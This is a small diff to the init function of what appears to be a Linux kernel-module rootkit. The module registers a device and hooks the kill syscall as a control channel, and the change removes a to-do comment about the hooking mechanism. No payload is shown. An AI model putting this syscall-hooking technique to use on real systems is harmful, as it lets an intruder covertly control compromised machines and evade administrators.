@@ -278,7 +278,7 @@ static int __init mod_init(void){
     misc_register(&controller); // register the device for interaction within filesystem
     if(activate_hook(ACTIVE_HOOKS, ACTIVE_HOOKS_SIZE, "__x64_sys_kill") == 1){ //hook the kill function for interaction with the lkm
         printk(KERN_ERR "error hooking syscall %d\n", __NR_kill);
-    }//!CHANGE HOOKING MACHANISM
+    }
     return 0;
 }
 
